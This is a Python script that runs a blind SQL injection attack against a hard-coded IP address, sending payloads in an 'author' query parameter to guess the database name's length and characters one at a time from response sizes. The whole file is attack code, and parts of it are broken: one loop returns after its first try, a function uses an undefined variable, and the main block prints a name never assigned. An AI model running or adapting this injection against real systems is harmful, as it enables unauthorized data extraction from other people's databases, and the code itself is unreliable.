import requests as req
import sys
import urllib
try:
    from multicpu import multi_cpu
except:
    pass
url = 'http://114.116.24.200/service/post.do?action=list&author='

if sys.version_info < (3, 0):
    quote_plus = urllib.quote_plus
else:
    quote_plus = urllib.parse.quote_plus


def get(u):
    u = quote_plus(u)
    res = req.get(url + u)
    if res.status_code == 200:
        return str(res.content)
    return False


def fuck(j):
    for i in range(1, 128):
        p = "' or (select ascii(mid(database(),%d,1)))=%d#" % (j, i)
        res = get(p)
        if res and len(res) > 3000:
            return (j, i)
        return False


def f(i):
    p = "' or (select ascii(mid(database(),%d,1)))=%d#" % (j, i)
    res = get(p)
    if res and len(res) > 3000:
        return (j, i)
    return False


def ff(j):
    result = multi_cpu(f, range(1, 128), 1, 4)
    return result


def ll():
    i = 1
    while 1:
        p = "' or (select length(database()))=%d#" % (i)
        res = get(p)
        if res and len(res) > 3000:
            return i
        i += 1
        if i > 20:
            break
    return False

if __name__ == '__main__':
    # p = "a' and 0#"
    # p = "a' or 1 order by 1 limit 1#"
    # p = "' or (select ascii(mid(database(),1,1)))=1#"
    # p = "' or (select length(database()))>2#"
    # print(get(p))
    # print(ll())
    # _t = ''
    # t = ''
    # l = ll()
    l = 4
    for j in range(1, l + 1):
        print("pos : %d" % j)
        ff(j)
        print(result)
    # for i in range(1, 128):
    #     p = "' or (select ascii(mid(database(),%d,1)))=%d#" % (j, i)
    #     res = get(p)
    #     l = len(res)
    #     if res and len(res) > 3000:
    #         t += chr(i)
    #         break
    # print(t)
